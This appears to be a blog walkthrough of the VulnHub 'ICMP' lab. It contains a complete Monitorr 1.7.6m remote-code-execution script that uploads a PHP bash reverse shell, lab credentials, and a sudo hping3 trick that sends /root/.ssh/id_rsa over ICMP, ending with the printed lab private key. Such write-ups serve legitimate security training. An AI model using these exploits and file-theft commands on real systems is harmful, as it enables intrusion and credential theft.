---
layout: post
title:  "VulnHub - ICMP"
date:   2021-03-07 10:10:05 +0300
categories: [vulnhub,walkthrough]
pin: false
tags: [exploitdb,monitorr,Enumeration,hping3,id_rsa]
---
You’ll find this vm in  `https://www.vulnhub.com/entry/icmp-1,633/`
## Port Scan

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ nmap 10.0.2.197 -p-
  Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-07 18:48 EET
  Nmap scan report for 10.0.2.197 (10.0.2.197)
  Host is up (0.00088s latency).
  Not shown: 65533 closed ports
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
{% endhighlight %}

## Searchsploit
- If we check the port `80` we will see that it runs the `Monitorr` Software
{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ searchsploit Monitorr                          
  ---------------------------------------------- ---------------------------------
   Exploit Title                                |  Path
  ---------------------------------------------- ---------------------------------
  Monitorr 1.7.6m - Authorization Bypass        | php/webapps/48981.py
  Monitorr 1.7.6m - Remote Code Execution (Unau | php/webapps/48980.py
  ---------------------------------------------- ---------------------------------
  Shellcodes: No Results

  ┌──(alienum㉿kali)-[~]
  └─$ locate php/webapps/48980.py
  /usr/share/exploitdb/exploits/php/webapps/48980.py
{% endhighlight %}

## Python Script - Edited

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ cp /usr/share/exploitdb/exploits/php/webapps/48980.py .
  {% endhighlight %}

  - Note : edit the urls add `/mon/` before every `/assets`
  - Below the script :
  {% highlight python %}                                                                                                       
  #!/usr/bin/python
  # -*- coding: UTF-8 -*-

  # Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
  # Date: September 12, 2020
  # Exploit Author: Lyhin's Lab
  # Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
  # Software Link: https://github.com/Monitorr/Monitorr
  # Version: 1.7.6m
  # Tested on: Ubuntu 19

  import requests
  import os
  import sys

  if len (sys.argv) != 4:
  	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
  else:
      url = sys.argv[1] + "/mon/assets/php/upload.php"
      headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

      data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"

      requests.post(url, headers=headers, data=data)

      print ("A shell script should be uploaded. Now we try to execute it")
      url = sys.argv[1] + "/assets/data/usrimg/she_ll.php"
      headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
      requests.get(url, headers=headers)
{% endhighlight %}

## Reverse Shell

- My VM

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ python3 48980.py http://10.0.2.197 10.0.2.15 5555

  A shell script should be uploaded. Now we try to execute it
{% endhighlight %}

- Listener

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ nc -lvp 5555       
  listening on [any] 5555 ...
  connect to [10.0.2.15] from 10.0.2.197 [10.0.2.197] 46598
  bash: cannot set terminal process group (522): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@icmp:/var/www/html/mon/assets/data/usrimg$
{% endhighlight %}

## Enumeration

{% highlight sh %}
  www-data@icmp:~$ ls
  ls
  devel
  local.txt
  reminder
  www-data@icmp:~$ cat reminder
  cat reminder
  crypt with crypt.php: done, it works
  work on decrypt with crypt.php: howto?!?
  www-data@icmp:~$ cd devel
  cd devel
  www-data@icmp:~/devel$ ls
  ls
  ls: cannot open directory '.': Permission denied
  www-data@icmp:~/devel$ cat crypt.php
  cat crypt.php
  <?php
  echo crypt('BUHNIJMONIBUVCYTTYVGBUHJNI','da');
  ?>
  www-data@icmp:~/devel$
{% endhighlight %}

## SSH Login | USER
-  Credentials `fox` : `BUHNIJMONIBUVCYTTYVGBUHJNI`
{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ ssh fox@10.0.2.197
  fox@10.0.2.197's password: BUHNIJMONIBUVCYTTYVGBUHJNI
  Linux icmp 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64

  The programs included with the Debian GNU/Linux system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.

  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
  permitted by applicable law.
  Last login: Thu Dec  3 16:14:19 2020 from 192.168.0.114
  $ ls
  devel  local.txt  reminder
  $ id          
  uid=1000(fox) gid=1000(fox) groups=1000(fox)
  $ cat local.txt
  c9db6c88939a2ae091c431a45fb1e59c
  $
{% endhighlight %}


## Sudo | hping3
{% highlight sh %}
  $ sudo -l
  [sudo] password for fox:
  Matching Defaults entries for fox on icmp:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

  User fox may run the following commands on icmp:
      (root) /usr/sbin/hping3 --icmp *
      (root) /usr/bin/killall hping3
{% endhighlight %}

## Read root id_rsa using hping3

- Terminal `1`

`sudo -u root /usr/sbin/hping3 --icmp 127.0.0.1 --listen signature --safe`

- Terminal `2`

`sudo -u root /usr/sbin/hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa`

#### In Action
- Terminal `2`
{% highlight sh %}
  $ sudo -u root /usr/sbin/hping3 --icmp 127.0.0.1 -d 100 --sign signature --file /root/.ssh/id_rsa
  [sudo] password for fox:
  HPING 127.0.0.1 (lo 127.0.0.1): icmp mode set, 28 headers + 100 data bytes
  [main] memlockall(): Success
  Warning: can't disable memory paging!
  len=128 ip=127.0.0.1 ttl=64 id=40341 icmp_seq=0 rtt=5.4 ms
  len=128 ip=127.0.0.1 ttl=64 id=40534 icmp_seq=1 rtt=7.4 ms
  ...
{% endhighlight %}

- Terminal `1`

{% highlight sh %}
  $ sudo -u root /usr/sbin/hping3 --icmp 127.0.0.1 --listen signature --safe
  Warning: Unable to guess the output interface
  hping3 listen mode
  [main] memlockall(): Success
  Warning: can't disable memory paging!
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
{% endhighlight %}

## Rooted

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ cd Desktop

  ┌──(alienum㉿kali)-[~/Desktop]
  └─$ nano id_rsa    

  ┌──(alienum㉿kali)-[~/Desktop]
  └─$ chmod 600 id_rsa

  ┌──(alienum㉿kali)-[~/Desktop]
  └─$ ssh -i id_rsa root@10.0.2.197
  Linux icmp 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64

  The programs included with the Debian GNU/Linux system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.

  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
  permitted by applicable law.
  root@icmp:~# ls
  proof.txt
  root@icmp:~# cat proof.txt
  9377e773846aeabb51b37155e15cf638
  root@icmp:~# alienum
{% endhighlight %}
